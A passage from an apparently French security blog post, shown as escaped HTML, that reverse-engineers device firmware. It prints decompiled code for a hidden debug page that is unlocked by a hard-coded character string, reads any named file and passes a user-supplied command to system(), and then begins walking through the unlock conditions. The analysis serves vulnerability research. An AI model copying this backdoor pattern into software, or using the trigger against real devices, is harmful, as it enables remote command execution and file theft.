&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">((((&lt;/span>&lt;span class="n">local_115&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="sc">&amp;#39;t&amp;#39;&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">local_114&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="sc">&amp;#39;e&amp;#39;&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">local_113&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="sc">&amp;#39;n&amp;#39;&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">((&lt;/span>&lt;span class="n">local_112&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="sc">&amp;#39;o&amp;#39;&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">local_111&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="sc">&amp;#39;u&amp;#39;&lt;/span>&lt;span class="p">))))))&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(((&lt;/span>&lt;span class="n">local_110&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="sc">&amp;#39;g&amp;#39;&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">((((&lt;/span>&lt;span class="n">local_10f&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="sc">&amp;#39;h&amp;#39;&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">local_10e&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="sc">&amp;#39;m&amp;#39;&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">local_10d&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="sc">&amp;#39;i&amp;#39;&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">((&lt;/span>&lt;span class="n">local_10c&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="sc">&amp;#39;n&amp;#39;&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">local_10b&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="sc">&amp;#39;e&amp;#39;&lt;/span>&lt;span class="p">))))))&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(((&lt;/span>&lt;span class="n">local_10a&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="sc">&amp;#39;r&amp;#39;&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="n">local_109&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="sc">&amp;#39;a&amp;#39;&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">local_108&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="sc">&amp;#39;l&amp;#39;&lt;/span>&lt;span class="p">))))&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">local_107&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="sc">&amp;#39;^&amp;#39;&lt;/span>&lt;span class="p">))))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">))))&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">iVar1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">get_value&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">param_1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">DAT_00477bb0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">auStack_238&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">((((&lt;/span>&lt;span class="n">iVar1&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">iVar1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">memcmp&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">auStack_238&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">DAT_00477bb4&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="n">iVar1&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">||&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="n">iVar1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">get_value&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">param_1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s">&amp;#34;fdump&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">auStack_238&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="n">iVar1&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">||&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="n">iVar1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">memcmp&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">auStack_238&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">DAT_00477e10&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="n">iVar1&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">puts&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&amp;lt;html&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">puts&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;center&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">puts&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&amp;lt;form method=get action=&lt;/span>&lt;span class="se">\&amp;#34;&lt;/span>&lt;span class="s">/cgi-bin/d.cgi&lt;/span>&lt;span class="se">\&amp;#34;&lt;/span>&lt;span class="s"> name=&lt;/span>&lt;span class="se">\&amp;#34;&lt;/span>&lt;span class="s">dform&lt;/span>&lt;span class="se">\&amp;#34;&lt;/span>&lt;span class="s">&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&amp;lt;input type=hidden name=act value=1&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">puts&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;File Name : &amp;lt;input type=text name=&lt;/span>&lt;span class="se">\&amp;#34;&lt;/span>&lt;span class="s">fname&lt;/span>&lt;span class="se">\&amp;#34;&lt;/span>&lt;span class="s"> value=&lt;/span>&lt;span class="se">\&amp;#34;\&amp;#34;&lt;/span>&lt;span class="s"> size=50 maxlength=120&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">puts&lt;/span>&lt;span class="p">(&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s">&amp;#34;Command Name : &amp;lt;input type=text name=&lt;/span>&lt;span class="se">\&amp;#34;&lt;/span>&lt;span class="s">cmd&lt;/span>&lt;span class="se">\&amp;#34;&lt;/span>&lt;span class="s"> value=&lt;/span>&lt;span class="se">\&amp;#34;\&amp;#34;&lt;/span>&lt;span class="s"> size=64 maxlength=256&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&amp;lt;input type=text name=&lt;/span>&lt;span class="se">\&amp;#34;&lt;/span>&lt;span class="s">aaksjdkfj&lt;/span>&lt;span class="se">\&amp;#34;&lt;/span>&lt;span class="s"> value=&lt;/span>&lt;span class="se">\&amp;#34;&lt;/span>&lt;span class="s">%s&lt;/span>&lt;span class="se">\&amp;#34;&lt;/span>&lt;span class="s"> size=64 maxlength=256&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">local_118&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">puts&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&amp;lt;input type=submit name=&lt;/span>&lt;span class="se">\&amp;#34;&lt;/span>&lt;span class="s">dapply&lt;/span>&lt;span class="se">\&amp;#34;&lt;/span>&lt;span class="s"> value=&lt;/span>&lt;span class="se">\&amp;#34;&lt;/span>&lt;span class="s"> Show &lt;/span>&lt;span class="se">\&amp;#34;&lt;/span>&lt;span class="s">&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">puts&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&amp;lt;/form&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">puts&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&amp;lt;/center&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">iVar1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">get_value&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">param_1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">DAT_00477bb0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">auStack_238&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="n">iVar1&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">iVar1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">memcmp&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">auStack_238&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">DAT_00477bb4&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="n">iVar1&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">iVar1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">get_value&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">param_1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s">&amp;#34;fname&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">acStack_4b8&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">iVar1&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">pFVar2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">fopen&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">acStack_4b8&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s">&amp;#34;r&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">pFVar2&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">FILE&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="mh">0x0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">puts&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;file open error!&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">while&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nb">true&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">pcVar3&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">fgets&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">acStack_438&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0x100&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">pFVar2&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">pcVar3&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="mh">0x0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&amp;lt;font size=-1&amp;gt;%s&amp;lt;/font&amp;gt;&amp;lt;br&amp;gt;&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">acStack_438&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">fclose&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">pFVar2&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">iVar1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">get_value&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">param_1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">DAT_00477d84&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">auStack_218&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">iVar1&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&amp;lt;b&amp;gt;command = %s&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">auStack_218&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">sprintf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">acStack_438&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s">&amp;#34;%s &amp;gt;&amp;gt; /var/run/cmd_temp&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">auStack_218&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">system&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">acStack_438&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">pFVar2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">fopen&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;/var/run/cmd_temp&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s">&amp;#34;r&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">pFVar2&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">FILE&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="mh">0x0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">while&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">pcVar3&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">fgets&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">acStack_438&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0x100&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">pFVar2&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="n">pcVar3&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="mh">0x0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&amp;lt;font size=-1&amp;gt;%s&amp;lt;/font&amp;gt;&amp;lt;br&amp;gt;&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">acStack_438&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">fclose&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">pFVar2&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">unlink&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;/var/run/cmd_temp&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">iVar1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">get_value&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">param_1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s">&amp;#34;fname&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">acStack_4b8&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">iVar1&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">pFVar2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">fopen&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">acStack_4b8&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s">&amp;#34;r&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">pFVar2&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">FILE&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="mh">0x0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">puts&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;file open error!&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">while&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nb">true&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">pcVar3&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">fgets&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">acStack_438&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0x100&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">pFVar2&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">pcVar3&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="mh">0x0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;%s&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">acStack_438&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">fclose&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">pFVar2&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;/div>
&lt;/div>
&lt;p>On peut voir qu&amp;rsquo;il y a différents éléments intéressants :&lt;/p>
&lt;ul>
&lt;li>La fonction renvoie un &lt;strong>formulaire HTML contenant des &lt;em>inputs&lt;/em> suspects tels que &lt;em>File Name&lt;/em> ou &lt;em>Command Name&lt;/em>&lt;/strong>&lt;/li>
&lt;li>La fonction appelle des fonctions également suspectes telles que &lt;strong>&lt;em>fopen&lt;/em> et &lt;em>system&lt;/em> utilisées respectivement pour l&amp;rsquo;ouverture de fichiers et l&amp;rsquo;exécution de commandes&lt;/strong>&lt;/li>
&lt;li>La fonction contient une &lt;strong>suite de conditions pour atteindre les deux précédents points&lt;/strong>&lt;/li>
&lt;/ul>
&lt;p>La prochaine étape aura donc pour objectif de vérifier chacunes des conditions afin de pouvoir atteindre cette &amp;ldquo;page de debug&amp;rdquo;.&lt;/p>
&lt;div class="flex align-center gblog-post__anchorwrap">
&lt;h3 id="une-option-pas-si-optionnelle"
>
Une option pas si optionnelle
&lt;/h3>
&lt;a data-clipboard-text="https://0x09.dev/posts/toto_decouvre_une_interface_de_debug/#une-option-pas-si-optionnelle" class="gblog-post__anchor clip flex align-center" aria-label="Anchor Une option pas si optionnelle" href="#une-option-pas-si-optionnelle">
&lt;svg class="gblog-icon gblog_link">&lt;use xlink:href="#gblog_link">&lt;/use>&lt;/svg>
&lt;/a>
&lt;/div>
&lt;p>Si on reprend le début de la fonction &lt;em>show_debug_screen&lt;/em>, on peut remarquer un appel à la fonction &lt;em>get_remote_support()&lt;/em>. La valeur renvoyée par cette dernière devra correspondre à 0 afin de satisfaire une des conditions d&amp;rsquo;entrée au bloc cible. Analysons donc cette fonction en incluant ses appels à la chaîne :&lt;/p>
